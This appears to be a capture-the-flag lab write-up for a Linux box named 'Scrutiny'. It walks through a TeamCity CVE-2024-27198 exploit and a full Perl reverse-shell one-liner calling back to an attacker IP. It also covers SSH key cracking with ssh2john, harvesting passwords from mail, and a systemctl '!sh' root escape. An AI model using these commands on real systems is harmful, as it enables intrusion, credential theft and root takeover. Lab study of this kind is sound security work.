# 🛡️ Scrutiny (Linux)

## 🔍 Initial Foothold
- Discovered a **TeamCity login page**.
- Found exploit: [CVE-2024-27198](https://github.com/Chocapikk/CVE-2024-27198)
  - Removed `import alive_progress` line due to errors.
  - Ran the exploit:
    ```bash
    python3 exploit.py --url http://teams.onlyrands.com/ --add-user
    ```
  - Gained user credentials and later a shell through command execution.
  - Upgraded to a reverse shell using:
    ```bash
    perl -e 'use Socket;$i="192.168.45.194";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));     if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");     open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'
    ```

- Found `id_rsa` in user section "marcot".
  - Converted to hash: `ssh2john id_rsa > hash`
  - Cracked to reveal password: `cheer`
  - SSH’d into machine as `marcot`.

## 🚀 Privilege Escalation
- As `marcot`, discovered `mathew`'s password using:
  ```bash
  grep -i password /var/mail/* /var/spool/mail/*
  ```
- Found `.~` hidden file in `mathew`'s home with password for user `briand` (aka Dach).
- Switched to `briand` using `su briand`.
- Ran `sudo -l` and discovered root access to:
  ```bash
  sudo systemctl status teamcity-server.service
  # or
  sudo -u root /usr/bin/systemctl status teamcity-server.service
  ```
- At the command output prompt, typed `!sh` to spawn a root shell.

## 🧠 Key Takeaways
- 🧾 Use enum tools like grep on system mail for leaked credentials.
- 🔑 Cracking `id_rsa` with `ssh2john` can be a golden ticket.
- 🐚 Reverse shell upgrade techniques matter.
- ⚙️ Abusing `systemctl` output commands like `!sh` is a powerful escalation vector.